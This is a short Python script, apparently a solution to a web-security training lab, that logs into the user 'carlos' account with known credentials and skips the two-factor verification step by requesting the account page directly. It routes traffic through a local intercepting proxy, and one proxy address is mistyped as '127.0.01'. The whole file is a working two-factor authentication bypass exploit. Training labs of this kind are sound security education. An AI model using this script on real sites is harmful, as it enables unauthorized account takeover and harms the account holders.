import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.01:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(s, url):

    # Log into Carlos's account
    print("(+) Logging into Carlos's account and bypassing 2FA verification...")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "montoya"}
    r = s.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)

    # Confirm bypass
    myaccount_url = url + "/my-account"
    r = s.get(myaccount_url, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("(+) Successfully bypassed 2FA verification.")
    else:
        print("(-) Exploit failed.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)

if __name__ == "__main__":
    main()